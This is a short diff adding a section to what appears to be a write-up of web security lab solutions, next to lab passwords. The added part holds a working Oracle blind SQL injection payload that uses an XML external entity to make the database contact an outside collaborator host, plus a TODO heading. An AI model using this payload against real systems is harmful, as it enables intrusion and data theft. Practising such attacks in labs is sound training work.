@@ -143,3 +143,12 @@ Password is: `2req0w`
 ```
 bu15v4
 ```
+
+### Blind SQL injection with out-of-band interaction
+
+```
+TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//x.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
+
+### Blind SQL injection with out-of-band data exfiltration
+TODO: Burp Suite Professional
